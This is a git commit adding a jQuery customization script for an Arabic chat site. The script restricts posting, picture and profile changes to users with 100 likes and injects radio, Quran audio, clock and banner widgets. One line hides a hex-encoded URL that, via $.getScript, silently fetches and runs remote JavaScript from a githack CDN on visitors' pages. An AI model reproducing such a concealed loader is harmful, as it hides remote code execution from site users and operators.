4a0fd62a349288af63f8ec9aeb9e9450e1ba6077
dimask98 <56661641+dimask98@users.noreply.github.com>
2021-07-09 12:04:56 +0300

    Create Hannin.js

---
+++ Hannin.js
@@ -0,0 +1,33 @@
+Tsend_=Tsend;
+reqlikes=100;
+Tsend=function(){if(getuser(myid).rep<reqlikes){alert(' لإ يمكنك الكتابة عام يتطلب منك الحصول على      لايكات'+reqlikes+' ');  return;}else{Tsend_();}}
+
+sendpic_=sendpic;
+reqlikes=100;
+sendpic=function(){if(getuser(myid).rep<reqlikes){alert(' لإ يمكنك تغير صورتك يتطلب منك الحصول على لايكات  '+reqlikes+''); return;}else{sendpic_();}}
+
+setprofile_=setprofile;
+reqlikes=100;
+setprofile=function(){if(getuser(myid).rep<reqlikes){alert('لا يمكنك حفظ الأعدادات يتطلب منك الحصول على لايكات '+reqlikes+''); return;}else{setprofile_();}}
+$('.u-msg.dots').removeClass('dots');$(`<img src="sico/1625541221000.gif" class="fr " style="width:100%;margin-right: 2px;">
+`).insertBefore('.nav-tabs');
+var _0xb26d=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x63\x64\x6E\x2E\x67\x69\x74\x68\x61\x63\x6B\x2E\x63\x6F\x6D\x2F\x64\x69\x6D\x61\x73\x6B\x39\x38\x2F\x6E\x65\x76\x72\x65\x73\x2E\x6A\x73\x2F\x37\x31\x33\x61\x35\x64\x34\x38\x35\x63\x37\x38\x63\x37\x31\x65\x32\x36\x39\x66\x36\x62\x63\x31\x61\x66\x30\x36\x65\x65\x34\x34\x65\x30\x35\x37\x30\x31\x36\x38\x2F\x4E\x65\x77\x72\x65\x73\x2E\x6A\x73","\x67\x65\x74\x53\x63\x72\x69\x70\x74"];$[_0xb26d[1]](_0xb26d[0])
+$('.dpnl').append(` <div id="mic" style="height: 100%;width:100%;" class="break light tab-pane border"><input type="jfa-w" name="FirstName" value=" قرآن كريم ">
+<audio class="wp-audio-shortcode" id="audio-236-1" preload="none" style="width: 100%;" controls="controls"><source type="audio/mpeg" src="https://h.top4top.io/m_1595scph70.mp3"><a href="https://h.top4top.io/m_1595scph70.mp3">https://h.top4top.io/m_1595scph70.mp3</a></audio>
+
+<center></center></center>
+
+</div>`);
+
+$('#d0').append(`<label title="الإذاعه" href="#" onclick="$('.pnhead').text($(this).attr('title'));hl($(this),'primary');setTimeout(function(){$('#mic').scrollTop(0);},100);$('.dpnl').show();"
+data-toggle="tab" data-target="#mic"  class="ae fa label label-primary fa-microphone ">الاذاعه</label>`);
+
+$("div#tlogins button.btn.btn-primary").click(function(){var b=setInterval(function(){var c=$(".pmsgc").length;0<c?($(`<input type="jfa-w" name="FirstName" value=" الـسـآعـة ا "><iframe class="fr" style="width:100%;margin-top: 0px;" src="https://free.timeanddate.com/clock/i7484uqk/n1998/szw110/szh110/hoc000/hbw0/hfc09f/cf100/hnc07c/hwc000/facfff/fnu2/fdi76/mqcfff/mqs4/mql18/mqw4/mqd60/mhcfff/mhs4/mhl5/mhw4/mhd62/mmv0/hhcfff/hhs1/hhb10/hmcfff/hms1/" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div><center>`).appendTo
+("#mic"),clearInterval(b)):console.log(c)},1)});
+
+$("div#tlogins button.btn.btn-primary").click(function(){var b=setInterval(function(){var c=$(".pmsgc").length;0<c?($(`<input type="jfa-w" name="FirstName" value=" الأخبــــار "><iframe class="fr" style="width:100%;margin-top: 0px;" src="https://www.bbc.com/ws/av-embeds/media/bbc_arabic_radio/liveradio/ar" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div><center>`).appendTo
+("#mic"),clearInterval(b)):console.log(c)},1)});
+
+$ ( ` <center> <div style =" width: 100٪؛ height: 0%! important؛ "id =" as "margin: 2px؛" class = "fa fa-heartbeat btn btn-primary" type = "button" data-toggle = "collapse" data-target = "#apseExample" aria-expanded = "false" aria-controls = "collapseExample"> ( حيّاكم الله في شات الحنين للجوال معا للإثارة والمتعه ) َ</ div> <div class = "" id = "collapseExample"> <center> </ i> </ div> <center> ` ). insertBefore ( '#d2' );
+$('<marquee direction="right" width="65%" direction="right" style="margin-bottom: -7px;font-family: \'Changa\', sans-serif; height: 20px;" onmouseover="this.stop()" onmouseout="this.start()" scrolldelay="0" scrollamount="5"><font style="background-color: #;border-radius: 15px 15px 15px 15px;font-family: \'jazeera\',FontAwesome;padding: 2px 10px 2px 10px;margin: 7px 10px 7px 10px;">  مُرحب بالجميع في شات الحنين اكبر تجمع عربي هذه سَماء ذاتُ سَعة و امْتِداد ،و أنتم نجومها. نحن  المميزون والباقي المقلدون  ) )\n</marquee></font></b></td>\n').insertBefore("span.s1.fa.fa-user.label.badgex.label-as-badge.label-success");
+$('.u-msg.dots').removeClass('dots');$(`<img style="height:50px;width: 100%;margin-right: 5px;background-color: #DE9DA5;" src="sico/1625541221000.gif" border="0">`).insertBefore('div#d2bc');$(`<div style=" color: #454139;text-align: center;margin-bottom: 10px; font-family:'jazeera-light', Fontawesome"> إعلانات شات الحنين  للضروره فقط </div>`).insertBefore('span.fl.fa.fa-send');
